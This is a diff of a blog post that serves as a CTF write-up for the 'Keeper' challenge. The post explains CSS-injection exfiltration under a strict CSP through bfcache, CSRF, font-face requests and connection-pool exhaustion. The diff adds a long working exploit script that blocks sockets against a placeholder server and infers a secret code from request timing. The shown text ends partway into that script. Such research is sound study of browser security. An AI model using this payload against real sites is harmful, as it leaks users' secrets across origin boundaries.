@@ -76,13 +76,13 @@
     
     
   </strong>
-  <span> • 1654 words</span>
-  <span> • 8 minute read</span>
+  <span> • 2236 words</span>
+  <span> • 11 minute read</span>
   
   
 </div>
 
-      <div class="content"><p>CSS Injections have always fascinated me. While reading <a href="https://blog.pspaul.de/posts/bench-press-leaking-text-nodes-with-css/">this post</a>, I asked myself &ldquo;is it possible to do CSS Exfiltration if default-src &lsquo;self&rsquo; is specified in the CSP?&rdquo;</p>
+      <div class="content"><p>CSS Injections have always fascinated me. A few months ago, I asked myself: <em>&ldquo;is it possible to do CSS Exfiltration if default-src &lsquo;self&rsquo; is specified in the CSP?&rdquo;</em></p>
 <p>Well, if you&rsquo;re reading this you already know the answer is yes. Also, I wrote a challenge about this technique for TRX CTF 2025: <a href="https://github.com/TheRomanXpl0it/TRX-CTF-2025/tree/main/web/keeper">Keeper</a>. This post will serve both as a writeup for the challenge and as an explanation of this new &ldquo;technique&rdquo;.</p>
 <!-- raw HTML omitted -->
 <h1 id="keeper">Keeper</h1>
@@ -164,7 +164,7 @@
 <p>To achieve our goal, we need to get the bot code and arbitrary HTML on the same page. How do we do this? Enter the <a href="https://developer.mozilla.org/en-US/docs/Glossary/bfcache">bfcache</a>. This cache stores entire pages, including dynamic modifications to the DOM. By letting the user visit a page we control, we can later go back in history using <code>window.history.go(-2)</code> where we will find the bot code.</p>
 <p>Result (With <code>d-none</code> removed):</p>
 <p><img src="/images/image-1.png" alt="alt text"></p>
-<p>When <code>window.history.go(-2)</code> is executed, the page becomes uncontrollable from another page due to the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy">COOP</a> header. The next step is to do CSRF to set arbitrary secrets.</p>
+<p>When <code>window.history.go(-2)</code> is executed, the page becomes isolated from other pages due to the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy">COOP</a> header. The next step is to do CSRF to set an arbitrary secret. This can be done by opening a separate window where a form targeting <code>http://localhost:1337/set-secret</code> will be submitted</p>
 <p><strong>exploit.html</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span>
@@ -240,11 +240,11 @@
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
 </span></span></code></pre></div><p><strong>Result</strong></p>
 <p><img src="/images/image-2.png" alt="alt text"></p>
-<p>Nice. Since no script can be executed, the only thing that can be done is CSS Injection. There&rsquo;s only one problem: the secret code can&rsquo;t be leaked using trivial methods since <code>default-src: self</code> is specified in the CSP, so no external requests can be sent.</p>
+<p>Nice. Since no script can be executed, the only thing that can be done is CSS Injection. Since the single code digits are in separate <code>&lt;input&gt;</code> tags, a simple Text Node Exfiltration is enough to leak the code. This can be done via <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face">font-face at rule</a> and unicode-range, <a href="https://book.hacktricks.wiki/en/pentesting-web/xs-search/css-injection/index.html#font-face--unicode-range">as described here</a>. There&rsquo;s only one problem: this technique won&rsquo;t work since <code>default-src: self</code> is specified in the CSP, so no external requests can be sent.</p>
 <p>So, how can we leak the code without sending external requests?
 This is where the Connection Pool comes into play.</p>
 <h3 id="swimming-in-the-connection-pool-">Swimming in the Connection Pool 🏊</h3>
-<p>Abusing the connection pool is not a new concept, and there have been numerous challenges built around this technique. The core idea is that if all sockets are occupied, no other requests can be made until one is freed. This can be exploited to measure the loading time of a request from another page or to detect if a resource has been requested.<br>
+<p>Abusing the connection pool is not a new concept, and there have been numerous challenges built around this technique. The core idea is that browsers use sockets to communicate with servers. As the operating system and the hardware it runs on have limited resources <!-- raw HTML omitted -->browsers have to impose a limit<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><!-- raw HTML omitted -->. If all sockets are occupied, no other requests can be made until one is freed. This can be exploited to measure the loading time of a request from another page or to detect if a resource has been requested.<br>
 However, the following technique doesn&rsquo;t require measuring the loading time or detecting resource requests. Instead, it involves counting how many requests have been made. For this challenge, I came up with a method using CSS injection to map each character in the charset (<code>abcdef0987654321</code>)to a number of requests, ranging from 1 to 16 (actually 3 to 18). These requests will be sent using the <code>font-face</code> at-rule. Here&rsquo;s an example:&quot;</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span>@<span style="color:#66d9ef">font-face</span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">font-family</span>:<span style="color:#a6e22e">has_A</span><span style="color:#f92672">;</span>
@@ -281,7 +281,7 @@ However, the following technique doesn&rsquo;t require measuring the loading tim
 <li>Block the last socket and keep its controller</li>
 <li>send a fetch request</li>
 <li>Wait until the first font request is made (in my exploit I wait 4 seconds)</li>
-<li>Free the last socket</li>
+<li><code>controller.abort()</code> from step <code>2</code></li>
 <li>Start sending fetch requests continuously (the exploit works even if you send requests to sleep.example.com or another host)</li>
 </ol>
 <p>Now, if everything is done correctly, this is what is going to happen:</p>
@@ -441,31 +441,20 @@ However, the following technique doesn&rsquo;t require measuring the loading tim
 <!-- raw HTML omitted -->
 <p>Example:</p>
 <p>This will send the request in the step <code>3</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fetch_2</span>(<span style="color:#a6e22e">i</span>){
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">start</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">performance</span>.<span style="color:#a6e22e">now</span>();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">controller</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">AbortController</span>();
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">controllers</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">controller</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`http://tester</span><span style="color:#e6db74">${</span>Math.<span style="color:#a6e22e">max</span>(<span style="color:#ae81ff">10</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">.sleep.pwnterroni.it`</span>, {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fetch_step_3</span>(<span style="color:#a6e22e">i</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// `http://zzzz${i}.${MYSERVER}/0?q=${i}` also works
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`/`</span>, {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
 </span></span><span style="display:flex;"><span>    });
 </span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">done</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>This will send the requests in the step <code>6</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fetch_sleep_short</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">i</span>) =&gt; {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fetch_step_6</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">i</span>) =&gt; {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">start</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">performance</span>.<span style="color:#a6e22e">now</span>();
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`http://tester</span><span style="color:#e6db74">${</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">MYSERVER</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/0?q=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`http://aaaaa</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">MYSERVER</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/0?q=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
 </span></span><span style="display:flex;"><span>    });
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">duration</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">performance</span>.<span style="color:#a6e22e">now</span>() <span style="color:#f92672">-</span> <span style="color:#a6e22e">start</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;SLEEP SHORT&#34;</span>, <span style="color:#a6e22e">duration</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;a aaaaaaaaaaaa&#34;</span>);
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">duration</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Now the requests will be loaded in the following order:</p>
 <ul>
@@ -484,8 +473,9 @@ However, the following technique doesn&rsquo;t require measuring the loading tim
 <p>Let&rsquo;s run another test</p>
 <p><img src="/images/image-4.png" alt="alt text"></p>
 <p>You can see how the requests with the origin alphabetically lower will load first.</p>
+<p><img src="/images/keeper-priority.gif" alt="alt test"></p>
 <p>Now the last thing is putting everything together!</p>
-<h2 id="final-exploit">Final exploit</h2>
+<h2 id="putting-it-all-together">Putting it all together</h2>
 <p><code>server1: zzzz${i}.server.com</code><br>
 <code>server2: aaaa${i}.server.com</code></p>
 <p>Here&rsquo;s what the exploit is going to do:</p>
@@ -529,8 +519,211 @@ However, the following technique doesn&rsquo;t require measuring the loading tim
     </div>
 
 <p>You can download the exploit from <a href="https://github.com/salvatore-abello/web-challenges/tree/main/TRX%20CTF%202025/Keeper/exploit">here</a></p>
-<h2 id="conclusion">Conclusion</h2>
-<p>The exploit could be much faster than it currently is. I also want to thank @simonedimaria for helping me with this research and keeping me sane. I’ll probably write another blog post about my findings here.</p>
+<h3 id="final-payload">Final payload</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">textarea</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;log&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width: 100%; height: 300px;&#34;</span>&gt;&lt;/<span style="color:#f92672">textarea</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">LOG</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Starting&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SOCKETLIMIT</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">255</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">MYSERVER</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`sleep.yourserver.test`</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">done</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">leaked_code</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">logtextarea</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;log&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sleep</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">ms</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#a6e22e">resolve</span> =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">ms</span>);
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">log</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">l</span>, <span style="color:#a6e22e">type</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;INFO&#39;</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">timestamp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Date().<span style="color:#a6e22e">toLocaleTimeString</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">prefix</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[!] &#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">type</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;SUCCESS&#39;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">prefix</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[+] &#39;</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">type</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;FAILURE&#39;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">prefix</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[x] &#39;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">logtextarea</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">`[</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">timestamp</span><span style="color:#e6db74">}</span><span style="color:#e6db74">] </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">prefix</span><span style="color:#e6db74">}${</span><span style="color:#a6e22e">l</span><span style="color:#e6db74">}</span><span style="color:#e6db74">\n`</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">logtextarea</span>.<span style="color:#a6e22e">scrollTop</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">logtextarea</span>.<span style="color:#a6e22e">scrollHeight</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fetch_sleep_long</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">i</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">controller</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">AbortController</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">signal</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">controller</span>.<span style="color:#a6e22e">signal</span>;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`http://sleep</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">MYSERVER</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/120?q=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">signal</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">signal</span>
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">controller</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fetch_step_6</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">i</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">start</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">performance</span>.<span style="color:#a6e22e">now</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`http://aaaaa</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">MYSERVER</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/0?q=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">block_socket</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">i</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fetch_sleep_long</span>(<span style="color:#a6e22e">i</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">exhaust_sockets</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span>() =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">SOCKETLIMIT</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">block_socket</span>(<span style="color:#a6e22e">i</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Used </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> connections`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fetch_step_3</span>(<span style="color:#a6e22e">i</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// `http://zzzz${i}.${MYSERVER}/0?q=${i}` also works
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`/`</span>, {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">done</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">leak_char</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">done</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">hashmap</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;A&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;B&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;C&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;D&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;E&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">6</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;F&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">7</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;0&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">8</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;9&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">9</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;8&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">10</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;7&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">11</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;6&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">12</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;5&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">13</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;4&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">14</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;3&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">15</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;2&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">16</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;1&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">res_blocker_controller</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch_sleep_long</span>(<span style="color:#ae81ff">1337</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">50</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Starting step 3...`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">5</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fetch_step_3</span>(<span style="color:#a6e22e">i</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Waiting for font requests...`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Wait until the first font is requested and then free the socket
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">4000</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res_blocker_controller</span>.<span style="color:#a6e22e">abort</span>();
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Starting step 6...`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch_step_6</span>(<span style="color:#a6e22e">i</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">done</span>){
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> [<span style="color:#a6e22e">hashmap</span>[<span style="color:#a6e22e">i</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>], <span style="color:#a6e22e">hashmap</span>[<span style="color:#a6e22e">i</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>] <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;A&#34;</span>];
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1000</span>);
